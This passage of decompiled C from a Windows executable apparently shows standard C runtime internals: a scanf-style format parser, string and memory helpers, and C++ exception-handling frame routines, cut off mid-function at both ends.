  local_19 = '\0';
  bVar1 = *param_2;
  local_8 = (undefined *)0x0;
  local_38 = 0;
  pbVar8 = param_2;
  ppbVar6 = (byte **)PTR_DAT_00408c00;
  do {
    PTR_DAT_00408c00 = (undefined *)ppbVar6;
    if (bVar1 == 0) {
LAB_00419402:
      if (local_18 == (byte **)0xffffffff) {
LAB_00419408:
        if ((local_38 == 0) && (local_19 == '\0')) {
          local_38 = -1;
        }
      }
      return local_38;
    }
    if ((int)DAT_00408e0c < 2) {
      uVar4 = *(byte *)((int)ppbVar6 + (uint)bVar1 * 2) & 8;
    }
    else {
      ppbVar6 = (byte **)0x8;
      uVar4 = FUN_0041b5b5(this,(uint)bVar1,8);
    }
    if (uVar4 != 0) {
      local_8 = local_8 + -1;
      ppbVar6 = param_1;
      uVar4 = FUN_00419489((int *)&local_8,param_1);
      FUN_00419472(uVar4,(char **)ppbVar6);
      uVar4 = FUN_0041c599(this_00,(uint)pbVar8[1]);
      ppbVar6 = extraout_ECX;
      pbVar9 = pbVar8;
      while (pbVar8 = pbVar9 + 1, uVar4 != 0) {
        ppbVar16 = (byte **)(uint)pbVar9[2];
        uVar4 = FUN_0041c599(ppbVar6,(int)(byte **)(uint)pbVar9[2]);
        ppbVar6 = ppbVar16;
        pbVar9 = pbVar8;
      }
    }
    if (*pbVar8 == 0x25) {
      local_39 = 0;
      local_1c = 0;
      local_1b = '\0';
      local_12 = '\0';
      local_13 = '\0';
      local_1a = '\0';
      puVar13 = (undefined *)0x0;
      local_9 = '\0';
      local_20 = 0;
      local_24 = 0;
      local_10 = 0;
      local_11 = '\x01';
      local_34 = (undefined4 *)0x0;
      do {
        uVar4 = (uint)pbVar8[1];
        param_2 = pbVar8 + 1;
        if ((int)DAT_00408e0c < 2) {
          uVar5 = (byte)PTR_DAT_00408c00[uVar4 * 2] & 4;
          ppbVar6 = (byte **)PTR_DAT_00408c00;
        }
        else {
          ppbVar16 = (byte **)0x4;
          uVar5 = FUN_0041b5b5(ppbVar6,uVar4,4);
          ppbVar6 = ppbVar16;
        }
        if (uVar5 == 0) {
          if (uVar4 < 0x4f) {
            if (uVar4 != 0x4e) {
              if (uVar4 == 0x2a) {
                local_12 = local_12 + '\x01';
              }
              else if (uVar4 != 0x46) {
                if (uVar4 == 0x49) {
                  if ((pbVar8[2] != 0x36) || (pbVar8[3] != 0x34)) goto LAB_00418b57;
                  local_34 = (undefined4 *)((int)local_34 + 1);
                  local_2c = 0;
                  param_2 = pbVar8 + 3;
                }
                else if (uVar4 == 0x4c) {
                  local_11 = local_11 + '\x01';
                }
                else {
LAB_00418b57:
                  local_13 = local_13 + '\x01';
                }
              }
            }
          }
          else if (uVar4 == 0x68) {
            local_11 = local_11 + -1;
            local_9 = local_9 + -1;
          }
          else {
            if (uVar4 == 0x6c) {
              local_11 = local_11 + '\x01';
            }
            else if (uVar4 != 0x77) goto LAB_00418b57;
            local_9 = local_9 + '\x01';
          }
        }
        else {
          local_24 = local_24 + 1;
          local_10 = (uVar4 - 0x30) + local_10 * 10;
        }
        pbVar8 = param_2;
      } while (local_13 == '\0');
      puVar12 = param_3;
      if (local_12 == '\0') {
        local_30 = (undefined4 *)*param_3;
        puVar12 = param_3 + 1;
        local_48 = param_3;
      }
      param_3 = puVar12;
      local_13 = '\0';
      if (local_9 == '\0') {
        if ((*param_2 == 0x53) || (*param_2 == 0x43)) {
          local_9 = '\x01';
        }
        else {
          local_9 = -1;
        }
      }
      uVar4 = *param_2 | 0x20;
      local_40 = uVar4;
      if (uVar4 != 0x6e) {
        if ((uVar4 == 99) || (uVar4 == 0x7b)) {
          local_8 = local_8 + 1;
          ppbVar6 = param_1;
          local_18 = (byte **)FUN_00419458(param_1);
        }
        else {
          ppbVar6 = param_1;
          local_18 = (byte **)FUN_00419489((int *)&local_8,param_1);
        }
      }
      if ((local_24 != 0) && (local_10 == 0)) {
LAB_004193e2:
        local_8 = local_8 + -1;
        FUN_00419472((uint)local_18,(char **)param_1);
        goto LAB_00419402;
      }
      if (uVar4 < 0x70) {
        if (uVar4 == 0x6f) {
LAB_0041910f:
          if (local_18 == (byte **)0x2d) {
            local_1b = '\x01';
          }
          else if (local_18 != (byte **)0x2b) goto LAB_00419144;
          local_10 = local_10 + -1;
          if ((local_10 == 0) && (local_24 != 0)) {
            local_13 = '\x01';
          }
          else {
            local_8 = local_8 + 1;
            ppbVar6 = param_1;
            local_18 = (byte **)FUN_00419458(param_1);
          }
          goto LAB_00419144;
        }
        if (uVar4 != 99) {
          if (uVar4 == 100) goto LAB_0041910f;
          if (uVar4 < 0x65) {
LAB_00418e87:
            if ((byte **)(uint)*param_2 != local_18) goto LAB_004193e2;
            local_19 = local_19 + -1;
            if (local_12 == '\0') {
              param_3 = local_48;
            }
            goto LAB_00419363;
          }
          if (0x67 < uVar4) {
            if (uVar4 == 0x69) {
              uVar4 = 100;
              goto LAB_00418c45;
            }
            if (uVar4 != 0x6e) goto LAB_00418e87;
            puVar13 = local_8;
            if (local_12 != '\0') goto LAB_00419363;
            goto LAB_0041933d;
          }
          pcVar10 = &local_1c8;
          if (local_18 == (byte **)0x2d) {
            local_1c8 = '-';
            pcVar10 = local_1c7;
LAB_00418c7b:
            local_10 = local_10 + -1;
            local_8 = local_8 + 1;
            ppbVar6 = param_1;
            local_18 = (byte **)FUN_00419458(param_1);
          }
          else if (local_18 == (byte **)0x2b) goto LAB_00418c7b;
          if ((local_24 == 0) || (0x15d < local_10)) {
            local_10 = 0x15d;
          }
          while( true ) {
            ppbVar16 = local_18;
            if ((int)DAT_00408e0c < 2) {
              uVar4 = (byte)PTR_DAT_00408c00[(int)local_18 * 2] & 4;
            }
            else {
              uVar4 = FUN_0041b5b5(ppbVar6,(int)local_18,4);
            }
            if ((uVar4 == 0) ||
               (iVar14 = local_10 + -1, bVar15 = local_10 == 0, local_10 = iVar14, bVar15)) break;
            local_20 = local_20 + 1;
            *pcVar10 = (char)ppbVar16;
            pcVar10 = pcVar10 + 1;
            local_8 = local_8 + 1;
            ppbVar6 = param_1;
            local_18 = (byte **)FUN_00419458(param_1);
          }
          if ((DAT_00408e10 == (char)ppbVar16) &&
             (iVar14 = local_10 + -1, bVar15 = local_10 != 0, local_10 = iVar14, bVar15)) {
            local_8 = local_8 + 1;
            ppbVar6 = param_1;
            ppbVar16 = (byte **)FUN_00419458(param_1);
            *pcVar10 = DAT_00408e10;
            while( true ) {
              pcVar10 = pcVar10 + 1;
              local_18 = ppbVar16;
              if ((int)DAT_00408e0c < 2) {
                uVar4 = (byte)PTR_DAT_00408c00[(int)ppbVar16 * 2] & 4;
              }
              else {
                uVar4 = FUN_0041b5b5(ppbVar6,(int)ppbVar16,4);
              }
              if ((uVar4 == 0) ||
                 (iVar14 = local_10 + -1, bVar15 = local_10 == 0, local_10 = iVar14, bVar15)) break;
              local_20 = local_20 + 1;
              *pcVar10 = (char)ppbVar16;
              local_8 = local_8 + 1;
              ppbVar6 = param_1;
              ppbVar16 = (byte **)FUN_00419458(param_1);
            }
          }
          pcVar11 = pcVar10;
          if ((local_20 != 0) &&
             (((ppbVar16 == (byte **)0x65 || (ppbVar16 == (byte **)0x45)) &&
              (iVar14 = local_10 + -1, bVar15 = local_10 != 0, local_10 = iVar14, bVar15)))) {
            *pcVar10 = 'e';
            pcVar11 = pcVar10 + 1;
            local_8 = local_8 + 1;
            ppbVar6 = param_1;
            ppbVar16 = (byte **)FUN_00419458(param_1);
            local_18 = ppbVar16;
            if (ppbVar16 == (byte **)0x2d) {
              *pcVar11 = '-';
              pcVar11 = pcVar10 + 2;
LAB_00418da2:
              bVar15 = local_10 != 0;
              local_10 = local_10 + -1;
              if (bVar15) goto LAB_00418db1;
              local_10 = 0;
            }
            else if (ppbVar16 == (byte **)0x2b) goto LAB_00418da2;
            while( true ) {
              if ((int)DAT_00408e0c < 2) {
                uVar4 = (byte)PTR_DAT_00408c00[(int)ppbVar16 * 2] & 4;
              }
              else {
                uVar4 = FUN_0041b5b5(ppbVar6,(int)ppbVar16,4);
              }
              if ((uVar4 == 0) ||
                 (iVar14 = local_10 + -1, bVar15 = local_10 == 0, local_10 = iVar14, bVar15)) break;
              local_20 = local_20 + 1;
              *pcVar11 = (char)ppbVar16;
              pcVar11 = pcVar11 + 1;
LAB_00418db1:
              local_8 = local_8 + 1;
              ppbVar6 = param_1;
              ppbVar16 = (byte **)FUN_00419458(param_1);
              local_18 = ppbVar16;
            }
          }
          local_8 = local_8 + -1;
          ppbVar6 = param_1;
          FUN_00419472((uint)ppbVar16,(char **)param_1);
          if (local_20 != 0) {
            if (local_12 == '\0') {
              local_38 = local_38 + 1;
              *pcVar11 = '\0';
              (*(code *)PTR_FUN_00408f38)(local_11 + -1,local_30,&local_1c8);
              ppbVar6 = extraout_ECX_00;
            }
            goto LAB_00419363;
          }
          goto LAB_00419402;
        }
        if (local_24 == 0) {
          local_10 = local_10 + 1;
          local_24 = 1;
        }
        if ('\0' < local_9) {
          local_1a = '\x01';
        }
        pcVar10 = &DAT_00408728;
LAB_00418f68:
        local_1c = 0xff;
        pbVar8 = (byte *)pcVar10;
        pbVar9 = param_2;
LAB_00418f6c:
        param_2 = pbVar9;
        FUN_00419530(local_68,0,0x20);
        if ((local_40 == 0x7b) && (*pbVar8 == 0x5d)) {
          uVar4 = 0x5d;
          local_5d = 0x20;
          pbVar8 = pbVar8 + 1;
        }
        else {
          uVar4 = (uint)local_39;
        }
        while (puVar12 = local_30, bVar1 = *pbVar8, bVar1 != 0x5d) {
          if (((bVar1 == 0x2d) && (bVar7 = (byte)uVar4, bVar7 != 0)) &&
             (bVar3 = pbVar8[1], bVar3 != 0x5d)) {
            if (bVar3 <= bVar7) {
              uVar4 = (uint)bVar3;
              bVar3 = bVar7;
            }
            if ((byte)uVar4 <= bVar3) {
              iVar14 = (bVar3 - uVar4) + 1;
              do {
                pbVar9 = (byte *)((int)local_68 + (uVar4 >> 3));
                *pbVar9 = *pbVar9 | '\x01' << ((byte)uVar4 & 7);
                uVar4 = uVar4 + 1;
                iVar14 = iVar14 + -1;
              } while (iVar14 != 0);
            }
            uVar4 = 0;
            pbVar8 = pbVar8 + 2;
          }
          else {
            uVar4 = (uint)bVar1;
            pbVar9 = (byte *)((int)local_68 + (uint)(bVar1 >> 3));
            *pbVar9 = *pbVar9 | '\x01' << (bVar1 & 7);
            pbVar8 = pbVar8 + 1;
          }
        }
        if (*pbVar8 == 0) goto LAB_00419402;
        if (local_40 == 0x7b) {
          param_2 = pbVar8;
        }
        local_8 = local_8 + -1;
        local_34 = local_30;
        ppbVar6 = param_1;
        FUN_00419472((uint)local_18,(char **)param_1);
        while( true ) {
          if ((local_24 != 0) &&
             (iVar14 = local_10 + -1, bVar15 = local_10 == 0, local_10 = iVar14, bVar15))
          goto LAB_004190d1;
          local_8 = local_8 + 1;
          local_18 = (byte **)FUN_00419458(param_1);
          if (local_18 == (byte **)0xffffffff) break;
          bVar1 = (byte)local_18;
          ppbVar6 = (byte **)(int)(char)(*(byte *)((int)local_68 + ((int)local_18 >> 3)) ^ local_1c)
          ;
          if (((uint)ppbVar6 & 1 << (bVar1 & 7)) == 0) break;
          if (local_12 == '\0') {
            if (local_1a == '\0') {
              *(byte *)puVar12 = bVar1;
              puVar12 = (undefined4 *)((int)puVar12 + 1);
              local_30 = puVar12;
            }
            else {
              local_3c = bVar1;
              if ((PTR_DAT_00408c00[((uint)local_18 & 0xff) * 2 + 1] & 0x80) != 0) {
                local_8 = local_8 + 1;
                uVar4 = FUN_00419458(param_1);
                local_3b = (undefined)uVar4;
              }
              FUN_0041c4d1(&local_42,&local_3c,DAT_00408e0c);
              *(WCHAR *)puVar12 = local_42;
              puVar12 = (undefined4 *)((int)puVar12 + 2);
              ppbVar6 = extraout_ECX_01;
              local_30 = puVar12;
            }
          }
          else {
            local_34 = (undefined4 *)((int)local_34 + 1);
          }
        }
        local_8 = local_8 + -1;
        ppbVar6 = param_1;
        FUN_00419472((uint)local_18,(char **)param_1);
LAB_004190d1:
        if (local_34 == puVar12) goto LAB_00419402;
        if ((local_12 == '\0') && (local_38 = local_38 + 1, local_40 != 99)) {
          if (local_1a == '\0') {
            *(undefined *)local_30 = 0;
          }
          else {
            *(undefined2 *)local_30 = 0;
          }
        }
      }
      else {
        if (uVar4 == 0x70) {
          local_11 = '\x01';
          goto LAB_0041910f;
        }
        if (uVar4 == 0x73) {
          if ('\0' < local_9) {
            local_1a = '\x01';
          }
          pcVar10 = s______00408720;
          goto LAB_00418f68;
        }
        if (uVar4 == 0x75) goto LAB_0041910f;
        if (uVar4 != 0x78) {
          if (uVar4 != 0x7b) goto LAB_00418e87;
          if ('\0' < local_9) {
            local_1a = '\x01';
          }
          pbVar8 = param_2 + 1;
          pbVar9 = pbVar8;
          if (*pbVar8 == 0x5e) {
            pcVar10 = (char *)(param_2 + 2);
            param_2 = pbVar8;
            goto LAB_00418f68;
          }
          goto LAB_00418f6c;
        }
LAB_00418c45:
        if (local_18 == (byte **)0x2d) {
          local_1b = '\x01';
LAB_00418ed4:
          local_10 = local_10 + -1;
          if ((local_10 == 0) && (local_24 != 0)) {
            local_13 = '\x01';
          }
          else {
            local_8 = local_8 + 1;
            ppbVar6 = param_1;
            local_18 = (byte **)FUN_00419458(param_1);
          }
        }
        else if (local_18 == (byte **)0x2b) goto LAB_00418ed4;
        if (local_18 == (byte **)0x30) {
          local_8 = local_8 + 1;
          ppbVar6 = param_1;
          local_18 = (byte **)FUN_00419458(param_1);
          if (((char)local_18 == 'x') || ((char)local_18 == 'X')) {
            local_8 = local_8 + 1;
            ppbVar6 = param_1;
            local_18 = (byte **)FUN_00419458(param_1);
            uVar4 = 0x78;
          }
          else {
            local_20 = 1;
            if (uVar4 == 0x78) {
              local_8 = local_8 + -1;
              ppbVar6 = param_1;
              FUN_00419472((uint)local_18,(char **)param_1);
              local_18 = (byte **)0x30;
            }
            else {
              uVar4 = 0x6f;
            }
          }
        }
LAB_00419144:
        if (local_34 == (undefined4 *)0x0) {
          if (local_13 == '\0') {
            while ((ppbVar16 = local_18, uVar4 != 0x78 && (uVar4 != 0x70))) {
              if ((int)DAT_00408e0c < 2) {
                uVar5 = (byte)PTR_DAT_00408c00[(int)local_18 * 2] & 4;
              }
              else {
                ppbVar2 = (byte **)0x4;
                uVar5 = FUN_0041b5b5(ppbVar6,(int)local_18,4);
                ppbVar6 = ppbVar2;
              }
              if (uVar5 == 0) goto LAB_0041930b;
              if (uVar4 == 0x6f) {
                if (0x37 < (int)ppbVar16) goto LAB_0041930b;
                iVar14 = (int)puVar13 << 3;
              }
              else {
                iVar14 = (int)puVar13 * 10;
              }
LAB_004192e3:
              local_20 = local_20 + 1;
              puVar13 = (undefined *)(iVar14 + -0x30 + (int)ppbVar16);
              if ((local_24 != 0) && (local_10 = local_10 + -1, local_10 == 0)) goto LAB_00419319;
              local_8 = local_8 + 1;
              ppbVar6 = param_1;
              local_18 = (byte **)FUN_00419458(param_1);
            }
            if ((int)DAT_00408e0c < 2) {
              uVar5 = (byte)PTR_DAT_00408c00[(int)local_18 * 2] & 0x80;
            }
            else {
              ppbVar2 = (byte **)0x80;
              uVar5 = FUN_0041b5b5(ppbVar6,(int)local_18,0x80);
              ppbVar6 = ppbVar2;
            }
            if (uVar5 != 0) {
              iVar14 = (int)puVar13 << 4;
              ppbVar2 = ppbVar16;
              ppbVar16 = (byte **)FUN_00419421(ppbVar6,(uint)ppbVar16);
              ppbVar6 = ppbVar2;
              local_18 = ppbVar16;
              goto LAB_004192e3;
            }
LAB_0041930b:
            local_8 = local_8 + -1;
            ppbVar6 = param_1;
            FUN_00419472((uint)ppbVar16,(char **)param_1);
          }
LAB_00419319:
          if (local_1b != '\0') {
            puVar13 = (undefined *)-(int)puVar13;
          }
        }
        else {
          if (local_13 == '\0') {
            while (ppbVar16 = local_18, uVar4 != 0x78) {
              if ((int)DAT_00408e0c < 2) {
                uVar5 = (byte)PTR_DAT_00408c00[(int)local_18 * 2] & 4;
              }
              else {
                uVar5 = FUN_0041b5b5(ppbVar6,(int)local_18,4);
              }
              if (uVar5 == 0) goto LAB_0041922d;
              if (uVar4 == 0x6f) {
                if (0x37 < (int)ppbVar16) goto LAB_0041922d;
                local_2c = FUN_0041c610(3,(int)local_2c._4_4_);
                ppbVar6 = extraout_ECX_02;
              }
              else {
                local_2c = FUN_0041c5d0((uint)local_2c,(uint)local_2c._4_4_,10,0);
                ppbVar6 = extraout_ECX_03;
              }
LAB_004191ff:
              local_20 = local_20 + 1;
              ppbVar16 = ppbVar16 + -0xc;
              local_2c = CONCAT44((int)local_2c._4_4_ + ((int)ppbVar16 >> 0x1f) +
                                  (uint)CARRY4((uint)local_2c,(uint)ppbVar16),
                                  (undefined *)((uint)local_2c + (int)ppbVar16));
              if ((local_24 != 0) && (local_10 = local_10 + -1, local_10 == 0)) goto LAB_0041923b;
              local_8 = local_8 + 1;
              ppbVar6 = param_1;
              local_18 = (byte **)FUN_00419458(param_1);
            }
            if ((int)DAT_00408e0c < 2) {
              uVar5 = (byte)PTR_DAT_00408c00[(int)local_18 * 2] & 0x80;
            }
            else {
              uVar5 = FUN_0041b5b5(ppbVar6,(int)local_18,0x80);
            }
            if (uVar5 != 0) {
              local_2c = FUN_0041c610(4,(int)local_2c._4_4_);
              ppbVar6 = ppbVar16;
              ppbVar16 = (byte **)FUN_00419421(this_01,(uint)ppbVar16);
              local_18 = ppbVar16;
              goto LAB_004191ff;
            }
LAB_0041922d:
            local_8 = local_8 + -1;
            ppbVar6 = param_1;
            FUN_00419472((uint)ppbVar16,(char **)param_1);
          }
LAB_0041923b:
          if (local_1b != '\0') {
            ppbVar6 = (byte **)-((int)local_2c._4_4_ + (uint)((uint)local_2c != 0));
            local_2c = CONCAT44(ppbVar6,-(uint)local_2c);
          }
        }
        if (uVar4 == 0x46) {
          local_20 = 0;
        }
        if (local_20 == 0) goto LAB_00419402;
        if (local_12 == '\0') {
          local_38 = local_38 + 1;
LAB_0041933d:
          if (local_34 == (undefined4 *)0x0) {
            if (local_11 == '\0') {
              *(short *)local_30 = (short)puVar13;
            }
            else {
              *local_30 = puVar13;
            }
          }
          else {
            *local_30 = (uint)local_2c;
            local_30[1] = local_2c._4_4_;
            ppbVar6 = local_2c._4_4_;
          }
        }
      }
LAB_00419363:
      local_19 = local_19 + '\x01';
      param_2 = param_2 + 1;
      this = ppbVar6;
    }
    else {
      local_8 = local_8 + 1;
      ppbVar6 = (byte **)FUN_00419458(param_1);
      param_2 = pbVar8 + 1;
      local_18 = ppbVar6;
      if ((byte **)(uint)*pbVar8 != ppbVar6) goto LAB_004193e2;
      this = PTR_DAT_00408c00;
      if ((PTR_DAT_00408c00[((uint)ppbVar6 & 0xff) * 2 + 1] & 0x80) != 0) {
        local_8 = local_8 + 1;
        ppbVar16 = (byte **)FUN_00419458(param_1);
        this = (void *)(uint)*param_2;
        param_2 = pbVar8 + 2;
        if ((byte **)this != ppbVar16) {
          local_8 = local_8 + -1;
          FUN_00419472((uint)ppbVar16,(char **)param_1);
          local_8 = local_8 + -1;
          FUN_00419472((uint)ppbVar6,(char **)param_1);
          goto LAB_00419402;
        }
        local_8 = local_8 + -1;
      }
    }
    if ((local_18 == (byte **)0xffffffff) && ((*param_2 != 0x25 || (param_2[1] != 0x6e))))
    goto LAB_00419408;
    bVar1 = *param_2;
    pbVar8 = param_2;
    ppbVar6 = (byte **)PTR_DAT_00408c00;
  } while( true );
}



uint __thiscall FUN_00419421(void *this,uint param_1)

{
  uint uVar1;
  
  if (DAT_00408e0c < 2) {
    uVar1 = (byte)PTR_DAT_00408c00[param_1 * 2] & 4;
  }
  else {
    uVar1 = FUN_0041b5b5(this,param_1,4);
  }
  if (uVar1 == 0) {
    param_1 = (param_1 & 0xffffffdf) - 7;
  }
  return param_1;
}



uint __cdecl FUN_00419458(byte **param_1)

{
  byte **ppbVar1;
  byte bVar2;
  uint uVar3;
  
  ppbVar1 = param_1 + 1;
  *ppbVar1 = *ppbVar1 + -1;
  if (-1 < (int)*ppbVar1) {
    bVar2 = **param_1;
    *param_1 = *param_1 + 1;
    return (uint)bVar2;
  }
  uVar3 = FUN_0041768f(param_1);
  return uVar3;
}



void __cdecl FUN_00419472(uint param_1,char **param_2)

{
  if (param_1 != 0xffffffff) {
    FUN_0041c62f(param_1,param_2);
  }
  return;
}



uint __cdecl FUN_00419489(int *param_1,byte **param_2)

{
  uint uVar1;
  uint uVar2;
  void *this;
  
  do {
    *param_1 = *param_1 + 1;
    uVar1 = FUN_00419458(param_2);
    uVar2 = FUN_0041c599(this,uVar1);
  } while (uVar2 != 0);
  return uVar1;
}



char * __cdecl FUN_004194b0(uint *param_1)

{
  char cVar1;
  uint uVar2;
  uint *puVar3;
  uint *puVar4;
  
  uVar2 = (uint)param_1 & 3;
  puVar3 = param_1;
  while (uVar2 != 0) {
    cVar1 = *(char *)puVar3;
    puVar3 = (uint *)((int)puVar3 + 1);
    if (cVar1 == '\0') goto LAB_00419503;
    uVar2 = (uint)puVar3 & 3;
  }
  do {
    do {
      puVar4 = puVar3;
      puVar3 = puVar4 + 1;
    } while (((*puVar4 ^ 0xffffffff ^ *puVar4 + 0x7efefeff) & 0x81010100) == 0);
    uVar2 = *puVar4;
    if ((char)uVar2 == '\0') {
      return (char *)((int)puVar4 - (int)param_1);
    }
    if ((char)(uVar2 >> 8) == '\0') {
      return (char *)((int)puVar4 + (1 - (int)param_1));
    }
    if ((uVar2 & 0xff0000) == 0) {
      return (char *)((int)puVar4 + (2 - (int)param_1));
    }
  } while ((uVar2 & 0xff000000) != 0);
LAB_00419503:
  return (char *)((int)puVar3 + (-1 - (int)param_1));
}



uint * __cdecl FUN_00419530(uint *param_1,byte param_2,uint param_3)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  uint *puVar4;
  
  if (param_3 == 0) {
    return param_1;
  }
  uVar1 = (uint)param_2;
  puVar4 = param_1;
  if (3 < param_3) {
    uVar2 = -(int)param_1 & 3;
    uVar3 = param_3;
    if (uVar2 != 0) {
      uVar3 = param_3 - uVar2;
      do {
        *(byte *)puVar4 = param_2;
        puVar4 = (uint *)((int)puVar4 + 1);
        uVar2 = uVar2 - 1;
      } while (uVar2 != 0);
    }
    uVar1 = uVar1 * 0x1010101;
    param_3 = uVar3 & 3;
    uVar3 = uVar3 >> 2;
    if (uVar3 != 0) {
      for (; uVar3 != 0; uVar3 = uVar3 - 1) {
        *puVar4 = uVar1;
        puVar4 = puVar4 + 1;
      }
      if (param_3 == 0) {
        return param_1;
      }
    }
  }
  do {
    *(char *)puVar4 = (char)uVar1;
    puVar4 = (uint *)((int)puVar4 + 1);
    param_3 = param_3 - 1;
  } while (param_3 != 0);
  return param_1;
}



undefined4 __thiscall
FUN_00419588(void *this,PEXCEPTION_RECORD param_1,PVOID param_2,undefined4 param_3,
            undefined4 param_4,int *param_5,int param_6,PVOID param_7,char param_8)

{
  undefined4 uVar1;
  code *extraout_ECX;
  
  if (*param_5 != 0x19930520) {
    FUN_00419e32((int)this);
    this = extraout_ECX;
  }
  if ((*(byte *)&param_1->ExceptionFlags & 0x66) == 0) {
    if (param_5[3] != 0) {
      if (((param_1->ExceptionCode == 0xe06d7363) && (0x19930520 < param_1->ExceptionInformation[0])
          ) && (this = *(code **)(param_1->ExceptionInformation[2] + 8), (code *)this != (code *)0x0
               )) {
        uVar1 = (*(code *)this)(param_1,param_2,param_3,param_4,param_5,param_6,param_7,param_8);
        return uVar1;
      }
      FUN_00419623(this,param_1,param_2,param_3,param_4,param_5,param_8,param_6,param_7);
    }
  }
  else if ((param_5[1] != 0) && (param_6 == 0)) {
    FUN_004198cf(this,(int)param_2,param_4,(int)param_5,-1);
  }
  return 1;
}



void __thiscall
FUN_00419623(void *this,PEXCEPTION_RECORD param_1,PVOID param_2,undefined4 param_3,
            undefined4 param_4,void *param_5,char param_6,int param_7,PVOID param_8)

{
  byte *pbVar1;
  PEXCEPTION_RECORD pEVar2;
  bool bVar3;
  undefined3 extraout_var;
  int *piVar4;
  int iVar5;
  void *extraout_ECX;
  void *extraout_ECX_00;
  void *extraout_ECX_01;
  byte **ppbVar6;
  void *this_00;
  uint local_1c;
  undefined4 local_18;
  int local_14;
  int local_10;
  byte *local_c;
  uint local_8;
  
  local_18 = local_18 & 0xffffff00;
  local_14 = *(int *)((int)param_2 + 8);
  if ((local_14 < -1) || (this_00 = param_5, this = param_5, *(int *)((int)param_5 + 4) <= local_14)
     ) {
    FUN_00419e32((int)this);
    this_00 = extraout_ECX;
  }
  pEVar2 = DAT_00425230;
  if (param_1->ExceptionCode == 0xe06d7363) {
    if (((param_1->NumberParameters == 3) && (param_1->ExceptionInformation[0] == 0x19930520)) &&
       (param_1->ExceptionInformation[2] == 0)) {
      if (DAT_00425230 == (PEXCEPTION_RECORD)0x0) {
        return;
      }
      this_00 = (void *)0x1;
      param_3 = DAT_00425234;
      local_18 = CONCAT31(local_18._1_3_,1);
      bVar3 = FUN_0041c701(DAT_00425230,1);
      if (CONCAT31(extraout_var,bVar3) == 0) {
        FUN_00419e32((int)this_00);
        this_00 = extraout_ECX_00;
      }
      param_1 = pEVar2;
      if (pEVar2->ExceptionCode != 0xe06d7363) goto LAB_0041979f;
      if (((pEVar2->NumberParameters == 3) && (pEVar2->ExceptionInformation[0] == 0x19930520)) &&
         (pEVar2->ExceptionInformation[2] == 0)) {
        FUN_00419e32((int)this_00);
        this_00 = extraout_ECX_01;
      }
    }
    iVar5 = local_14;
    if (((param_1->ExceptionCode == 0xe06d7363) && (param_1->NumberParameters == 3)) &&
       (param_1->ExceptionInformation[0] == 0x19930520)) {
      piVar4 = (int *)FUN_004158e2(this_00,(uint)param_5,param_7,local_14,&local_8,&local_1c);
      do {
        if (local_1c <= local_8) {
          if (param_6 == '\0') {
            return;
          }
          FUN_00419cf8((int)param_1);
          return;
        }
        if ((*piVar4 <= iVar5) && (iVar5 <= piVar4[1])) {
          pbVar1 = (byte *)piVar4[4];
          for (local_10 = piVar4[3]; iVar5 = local_14, 0 < local_10; local_10 = local_10 + -1) {
            ppbVar6 = *(byte ***)(param_1->ExceptionInformation[2] + 0xc);
            for (local_c = *ppbVar6; 0 < (int)local_c; local_c = local_c + -1) {
              ppbVar6 = ppbVar6 + 1;
              iVar5 = FUN_00419872(pbVar1,*ppbVar6,(uint *)param_1->ExceptionInformation[2]);
              if (iVar5 != 0) {
                FUN_00419983(param_1,param_2,param_3,param_4,(int)param_5,pbVar1,*ppbVar6,piVar4,
                             param_7,param_8);
                iVar5 = local_14;
                goto LAB_0041977f;
              }
            }
            pbVar1 = pbVar1 + 0x10;
          }
        }
LAB_0041977f:
        local_8 = local_8 + 1;
        piVar4 = piVar4 + 5;
      } while( true );
    }
  }
LAB_0041979f:
  if (param_6 == '\0') {
    FUN_004197ca(this_00,param_1,param_2,param_3,param_4,(uint)param_5,local_14,param_7,param_8);
    return;
  }
  FUN_00419ddc((int)this_00);
  return;
}



void __thiscall
FUN_004197ca(void *this,PEXCEPTION_RECORD param_1,PVOID param_2,undefined4 param_3,
            undefined4 param_4,uint param_5,int param_6,int param_7,PVOID param_8)

{
  int iVar1;
  int *piVar2;
  int iVar3;
  void *extraout_ECX;
  void *local_c;
  void *local_8;
  
  local_c = this;
  local_8 = this;
  if ((DAT_00425238 != 0) &&
     (iVar1 = FUN_004157b9(&param_1->ExceptionCode,param_2,param_3,param_4,param_5,param_7,param_8),
     this = extraout_ECX, iVar1 != 0)) {
    return;
  }
  piVar2 = (int *)FUN_004158e2(this,param_5,param_7,param_6,(uint *)&local_8,(uint *)&local_c);
  for (; local_8 < local_c; local_8 = (void *)((int)local_8 + 1)) {
    if ((*piVar2 <= param_6) && (param_6 <= piVar2[1])) {
      iVar3 = piVar2[3] * 0x10 + piVar2[4];
      iVar1 = *(int *)(iVar3 + -0xc);
      if ((iVar1 == 0) || (*(char *)(iVar1 + 8) == '\0')) {
        FUN_00419983(param_1,param_2,param_3,param_4,param_5,(byte *)(iVar3 + -0x10),(byte *)0x0,
                     piVar2,param_7,param_8);
      }
    }
    piVar2 = piVar2 + 5;
  }
  return;
}



undefined4 __cdecl FUN_00419872(byte *param_1,byte *param_2,uint *param_3)

{
  int iVar1;
  undefined4 uVar2;
  
  iVar1 = *(int *)(param_1 + 4);
  if ((iVar1 == 0) || (*(char *)(iVar1 + 8) == '\0')) {
LAB_004198c9:
    uVar2 = 1;
  }
  else {
    if (iVar1 == *(int *)(param_2 + 4)) {
LAB_004198a3:
      if (((((*param_2 & 2) == 0) || ((*param_1 & 8) != 0)) &&
          (((*param_3 & 1) == 0 || ((*param_1 & 1) != 0)))) &&
         (((*param_3 & 2) == 0 || ((*param_1 & 2) != 0)))) goto LAB_004198c9;
    }
    else {
      iVar1 = FUN_0041c760((undefined4 *)(iVar1 + 8),(byte *)(*(int *)(param_2 + 4) + 8));
      if (iVar1 == 0) goto LAB_004198a3;
    }
    uVar2 = 0;
  }
  return uVar2;
}



void __thiscall FUN_004198cf(void *this,int param_1,undefined4 param_2,int param_3,int param_4)

{
  int iVar1;
  void *extraout_ECX;
  void *extraout_ECX_00;
  int iVar2;
  undefined4 *unaff_FS_OFFSET;
  undefined4 local_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &DAT_00401270;
  puStack_10 = &LAB_0041bc48;
  local_14 = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &local_14;
  for (iVar2 = *(int *)(param_1 + 8); local_8 = 0xffffffff, iVar2 != param_4;
      iVar2 = *(int *)(*(int *)(param_3 + 8) + iVar2 * 8)) {
    if ((iVar2 < 0) || (*(int *)(param_3 + 4) <= iVar2)) {
      FUN_00419e32((int)this);
      this = extraout_ECX;
